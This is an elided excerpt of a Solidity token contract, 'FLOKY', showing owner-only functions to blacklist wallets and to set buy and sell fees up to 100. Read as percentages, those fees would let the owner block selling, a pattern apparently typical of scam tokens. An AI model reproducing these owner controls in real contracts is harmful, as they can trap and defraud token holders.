...
contract FLOKY is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Floky";
    string constant _symbol = "FLOKY";
    ...
    function swapBack() internal swapping {
        ...
        if (_balances[address(this)] >= swapThreshold*4)
    ...
    function setWalletLimit(uint256 amountPercent) external onlyOwner {
        ...
        require (_maxWalletAmount >= (_totalSupply/100) , "Must keep maxwallet more than 1%");
    }

    function BLBot(address botAddress, bool status) external onlyOwner {      
   ...
   function BLBots(address[] memory bots_, bool status) public onlyOwner {
    ...
    function SetFees(uint256 _MarketingFee, uint256 _sellMarketingFee) external onlyOwner {
         ...
         require(marketingFee <= 100 && sellMarketingFee <= 100);
    }
